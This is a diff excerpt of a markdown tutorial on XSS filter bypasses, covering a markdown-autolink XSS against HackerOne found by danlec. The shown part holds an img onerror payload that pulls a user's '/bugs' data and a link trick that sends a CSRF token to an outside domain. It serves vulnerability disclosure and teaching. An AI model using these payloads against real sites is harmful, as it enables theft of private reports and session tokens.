@@ -23,13 +23,13 @@ But there are some filters those need an protocol like `{anything}://` . But thi
 This one is basic too. Now we will discuss about a rare xss found by danlec which bypassed strong csp of hackerone.
 Hackerone uses daring fireball as markdown [https://daringfireball.net/projects/markdown/basics](https://daringfireball.net/projects/markdown/basics).
 Danlec found that `<http://\<h1\>test\</h1\>>` rendered to `http://<h1>test</h1>`
-Hackerone uses strong csp but some one can access the information of the user bugs
+Hackerone uses strong csp but some one can access the information of the user bugs 
 
 ```
 <http://\<img\ src=0\ onerror=\"$.getJSON(\'/bugs\',function(a){alert(JSON.stringify(a));})\"\>>
 ```
 
-But some can send csrf token to other domain by a link handle bypass
+Some can send csrf token to other domain by a link handle bypass
 
 ```html
 <a href="http://danlec.com" data-method="post">Proof of Concept</a>
